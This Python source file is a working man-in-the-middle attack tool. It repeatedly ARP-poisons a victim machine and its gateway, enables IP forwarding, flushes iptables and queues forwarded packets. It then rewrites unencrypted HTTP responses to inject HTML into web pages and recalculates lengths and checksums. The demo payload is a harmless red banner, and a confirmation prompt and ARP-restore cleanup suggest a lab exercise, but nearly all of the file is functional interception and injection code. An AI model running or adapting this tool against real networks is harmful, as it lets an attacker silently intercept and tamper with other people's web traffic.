#!/usr/bin/env python3
"""
Simple HTTP Interceptor - Avoids Gzip Issues
Focuses on reliable injection without complex compression handling
"""

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal
import sys
import time
import re
import logging
from datetime import datetime
import subprocess
import threading

# Import centralized configuration
from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig

# Use configuration values
victim_ip = AttackConfig.VICTIM_IP
gateway_ip = AttackConfig.GATEWAY_IP
interface = NetworkConfig.INTERFACE
victim_mac = AttackConfig.VICTIM_MAC
gateway_mac = AttackConfig.GATEWAY_MAC

# Simple injection payload (avoid complex payloads that might break)
SIMPLE_INJECTION = b'<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:10px;z-index:9999;">HTTP INJECTION SUCCESSFUL!</div>'

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('simple_http_attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SimpleStats:
    def __init__(self):
        self.total_responses = 0
        self.successful_injections = 0
        self.failed_injections = 0
        self.gzip_skipped = 0
        self.non_html_skipped = 0
        self.start_time = time.time()
    
    def print_stats(self):
        runtime = time.time() - self.start_time
        print(f"\n{'='*50}")
        print(f"📊 SIMPLE HTTP INTERCEPTOR STATISTICS")
        print(f"{'='*50}")
        print(f"⏱️  Runtime: {runtime:.1f} seconds")
        print(f"📦 Total HTTP responses: {self.total_responses}")
        print(f"✅ Successful injections: {self.successful_injections}")
        print(f"❌ Failed injections: {self.failed_injections}")
        print(f"🗜️  Gzip responses skipped: {self.gzip_skipped}")
        print(f"📄 Non-HTML responses skipped: {self.non_html_skipped}")
        
        if self.total_responses > 0:
            success_rate = (self.successful_injections / self.total_responses) * 100
            print(f"🎯 Success rate: {success_rate:.1f}%")
        
        print(f"\n💡 TIPS:")
        print(f"   • Visit HTTP-only sites like neverssl.com")
        print(f"   • Most modern sites use HTTPS (encrypted)")
        print(f"   • Gzip compression makes injection complex")
        print(f"   • This version focuses on simple, reliable injection")

stats = SimpleStats()

def enable_ip_forwarding():
    """Enable IP forwarding"""
    logger.info("[SETUP] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    return True

def disable_ip_forwarding():
    """Disable IP forwarding"""
    logger.info("[CLEANUP] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def poison(victim_ip, victim_mac, spoof_ip):
    """Send ARP poison packet"""
    pkt = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    sendp(pkt, iface=interface, verbose=0)

def restore(target_ip, target_mac, source_ip, source_mac):
    """Restore ARP table"""
    logger.info(f"[ARP-RESTORE] Restoring {target_ip} -> {source_ip} mapping")
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                      psrc=source_ip, hwsrc=source_mac)
    sendp(pkt, count=5, iface=interface, verbose=0)

def simple_inject(html_content, injection_payload):
    """Simple injection that works reliably"""
    # Try to inject after <body> tag
    body_pattern = re.compile(b'(<body[^>]*>)', re.IGNORECASE)
    match = body_pattern.search(html_content)
    
    if match:
        insert_pos = match.end()
        return html_content[:insert_pos] + injection_payload + html_content[insert_pos:]
    
    # Try to inject after <head> tag
    head_pattern = re.compile(b'(</head>)', re.IGNORECASE)
    match = head_pattern.search(html_content)
    
    if match:
        insert_pos = match.end()
        return html_content[:insert_pos] + injection_payload + html_content[insert_pos:]
    
    # Try to inject after <html> tag
    html_pattern = re.compile(b'(<html[^>]*>)', re.IGNORECASE)
    match = html_pattern.search(html_content)
    
    if match:
        insert_pos = match.end()
        return html_content[:insert_pos] + injection_payload + html_content[insert_pos:]
    
    # Last resort: prepend to content
    return injection_payload + html_content

def is_html_response(headers, body):
    """Check if this is an HTML response worth injecting"""
    # Must contain HTML content type
    if b'text/html' not in headers.lower():
        return False
    
    # Must have some substantial content
    if len(body) < 200:
        return False
    
    # Must look like HTML
    if not (b'<html' in body.lower() or b'<body' in body.lower() or b'<!doctype' in body.lower()):
        return False
    
    return True

def modify_packet(packet):
    """Simple packet modification focused on reliability"""
    try:
        scapy_pkt = IP(packet.get_payload())
        
        # Only process packets to/from our victim
        if not (scapy_pkt.src == victim_ip or scapy_pkt.dst == victim_ip):
            packet.accept()
            return
        
        # Only process TCP packets with payload
        if not (scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw)):
            packet.accept()
            return
        
        tcp_layer = scapy_pkt[TCP]
        payload = scapy_pkt[Raw].load
        
        # Only process HTTP responses (port 80)
        if not (tcp_layer.sport == 80 and payload.startswith(b'HTTP/')):
            packet.accept()
            return
        
        stats.total_responses += 1
        logger.info(f"[HTTP] Processing response from {scapy_pkt.src}")
        
        # Split headers and body
        try:
            headers, body = payload.split(b'\r\n\r\n', 1)
        except ValueError:
            logger.warning("[HTTP] Could not split headers and body")
            packet.accept()
            return
        
        # Skip gzip responses (they cause fragmentation issues)
        if b'content-encoding: gzip' in headers.lower():
            stats.gzip_skipped += 1
            logger.info("[HTTP] Skipping gzip response (fragmentation issues)")
            packet.accept()
            return
        
        # Check if this is HTML content
        if not is_html_response(headers, body):
            stats.non_html_skipped += 1
            logger.info("[HTTP] Skipping non-HTML response")
            packet.accept()
            return
        
        logger.warning(f"[HTTP] 🎯 Found injectable HTML response ({len(body)} bytes)")
        
        # Inject our payload
        try:
            injected_body = simple_inject(body, SIMPLE_INJECTION)
            
            if len(injected_body) <= len(body):
                logger.warning("[HTTP] Injection failed - no size increase")
                stats.failed_injections += 1
                packet.accept()
                return
            
            # Update Content-Length header
            headers_str = headers.decode('utf-8', errors='ignore')
            content_length_match = re.search(r'Content-Length:\s*(\d+)', headers_str, re.IGNORECASE)
            
            if content_length_match:
                old_length = content_length_match.group(1)
                new_length = str(len(injected_body))
                headers_str = re.sub(
                    r'(Content-Length:\s*)\d+',
                    f'Content-Length: {new_length}',
                    headers_str,
                    flags=re.IGNORECASE
                )
                logger.info(f"[HTTP] Updated Content-Length: {old_length} -> {new_length}")
            
            # Rebuild the packet
            new_payload = headers_str.encode() + b'\r\n\r\n' + injected_body
            scapy_pkt[Raw].load = new_payload
            
            # Clear checksums for recalculation
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            
            packet.set_payload(bytes(scapy_pkt))
            stats.successful_injections += 1
            logger.info(f"[HTTP] ✅ Successfully injected payload!")
            
        except Exception as e:
            logger.error(f"[HTTP] Injection failed: {e}")
            stats.failed_injections += 1
            packet.accept()
            return
        
        packet.accept()
        
    except Exception as e:
        logger.error(f"[ERROR] Packet processing failed: {e}")
        packet.accept()

def start_interception():
    """Start the simple HTTP interception"""
    logger.info("[SETUP] Setting up iptables rules")
    
    # Clear and set up iptables
    os.system("iptables -F")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    
    # Verify rule
    result = subprocess.run(['iptables', '-L', 'FORWARD', '-n'], capture_output=True, text=True)
    if 'NFQUEUE' in result.stdout:
        logger.info("[SETUP] ✅ iptables rule added successfully")
    else:
        logger.error("[SETUP] ❌ Failed to add iptables rule")
        return False
    
    # Start NetfilterQueue
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, modify_packet)
    
    logger.info("[MITM] 🚀 Simple HTTP interceptor started")
    logger.info(f"[MITM] 🎯 Target: {victim_ip}")
    logger.info("[MITM] 💡 Visit HTTP-only sites for best results")
    logger.info("[MITM] 🛑 Press Ctrl+C to stop")
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        logger.info("\n[MITM] 🛑 Stopping interceptor...")
    finally:
        nfqueue.unbind()
        os.system("iptables -F")
        stats.print_stats()
    
    return True

def print_simple_guide():
    """Print usage guide"""
    print("="*60)
    print("🎯 SIMPLE HTTP INTERCEPTOR")
    print("="*60)
    print("\n🔧 THIS VERSION:")
    print("   • Skips gzip responses (avoids fragmentation)")
    print("   • Focuses on plain HTML responses")
    print("   • Uses simple, reliable injection")
    print("   • Provides clear statistics")
    
    print("\n🧪 TESTING:")
    print("   • Visit: http://neverssl.com")
    print("   • Visit: http://httpforever.com")
    print("   • Visit: http://example.com")
    print("   • Avoid HTTPS sites (encrypted)")
    
    print("\n✅ EXPECTED RESULTS:")
    print("   • Red banner at top of HTTP pages")
    print("   • Clear success/failure statistics")
    print("   • No gzip decompression errors")
    
    print("="*60)

def main():
    """Main function"""
    print_simple_guide()
    
    if SecurityConfig.REQUIRE_CONFIRMATION:
        choice = input("\n🚀 Start simple HTTP interceptor? [y/N]: ").strip().lower()
        if choice not in ['y', 'yes']:
            print("❌ Cancelled")
            return
    
    logger.info("[ATTACK] 🚀 Starting simple ARP poisoning & HTTP injection")
    
    # Enable IP forwarding
    enable_ip_forwarding()
    
    # Set up cleanup handler
    def cleanup(signum, frame):
        logger.info("\n[CLEANUP] 🧹 Cleaning up...")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
        disable_ip_forwarding()
        os.system("iptables -F")
        logger.info("[CLEANUP] ✅ Cleanup complete")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, cleanup)
    
    # Start ARP poisoning
    def poison_loop():
        logger.info("[ARP] 🎯 Starting ARP poisoning")
        count = 0
        while True:
            poison(victim_ip, victim_mac, gateway_ip)
            poison(gateway_ip, gateway_mac, victim_ip)
            count += 2
            if count % 10 == 0:
                logger.info(f"[ARP] Sent {count} poison packets")
            time.sleep(2)
    
    poison_thread = threading.Thread(target=poison_loop, daemon=True)
    poison_thread.start()
    
    # Wait for ARP poisoning to take effect
    time.sleep(3)
    
    # Start HTTP interception
    start_interception()

if __name__ == "__main__":
    main() 